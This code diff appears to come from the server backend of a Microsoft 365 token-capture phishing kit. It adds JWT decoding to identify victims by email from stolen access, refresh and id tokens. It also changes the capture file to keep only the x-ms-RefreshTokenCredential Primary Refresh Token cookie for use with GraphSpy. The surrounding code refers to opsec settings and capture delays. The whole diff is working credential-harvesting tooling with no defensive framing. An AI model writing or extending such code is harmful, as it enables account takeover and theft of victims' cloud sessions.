@@ -54,6 +54,24 @@ function setBrowserLikeHeaders(res) {
   res.setHeader('Cache-Control', 'no-store');
 }
 
+function decodeJwtPayload(token) {
+    if (!token || typeof token !== 'string') return null;
+    try {
+        const base64 = token.split('.')[1];
+        if (!base64) return null;
+        const padded = base64 + '='.repeat((4 - (base64.length % 4)) % 4);
+        return JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
+    } catch (e) {
+        return null;
+    }
+}
+
+function extractEmailFromToken(token) {
+    const payload = decodeJwtPayload(token);
+    if (!payload) return null;
+    return payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
+}
+
 async function applyCaptureDelay() {
   try {
     const settings = await getOpsecSettings();
@@ -122,6 +140,10 @@ function buildCaptureFileContent(data) {
         kerberosTopLevelNames, tgtCloudSessionkey, accountType, tenant, ip,
         cookieCount, cookieSample, userAgent, linkId, tokenId,
     } = data;
+
+    const prtCookies = Array.isArray(cookieSample)
+        ? cookieSample.filter(c => c && c.name && String(c.name).toLowerCase() === 'x-ms-refreshtokencredential')
+        : [];
 
     const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
     const sep = '========================================';
@@ -202,12 +224,13 @@ function buildCaptureFileContent(data) {
         }
     }
 
-    // For COOKIE mode: show only cookies
-    if (tokenType === 'cookie' && (cookieSample || cookieCount)) {
-        const cookieText = Array.isArray(cookieSample)
-            ? cookieSample.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
-            : String(cookieSample || 'N/A');
-        out.push(`COOKIES (${cookieCount || 0} cookies):`);
+    // For COOKIE mode: show only the real GraphSpy PRT cookie. Ignore ordinary
+    // Microsoft cookies such as fpc / x-ms-gateway-slice / stsservicecookie.
+    if (tokenType === 'cookie') {
+        const cookieText = prtCookies.length > 0
+            ? prtCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
+            : 'NO PRT COOKIE CAPTURED';
+        out.push(`COOKIES (${Math.max(cookieCount || 0, prtCookies.length)} cookies):`);
         out.push(cookieText);
         out.push('');
     }
@@ -379,7 +402,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
             // Fix base64 padding if needed
             while (tokenPart.length % 4) tokenPart += '=';
             const payload = JSON.parse(Buffer.from(tokenPart, 'base64').toString());
-            email = payload.email || payload.upn || payload.preferred_username || null;
+            email = payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
             idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
 
             // Detect account type from email domain
@@ -390,6 +413,10 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 }
             }
         } catch (e) { /* ignore decode errors */ }
+    }
+
+    if (!email) {
+        email = extractEmailFromToken(access_token) || extractEmailFromToken(refresh_token) || extractEmailFromToken(id_token) || null;
     }
 
     // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
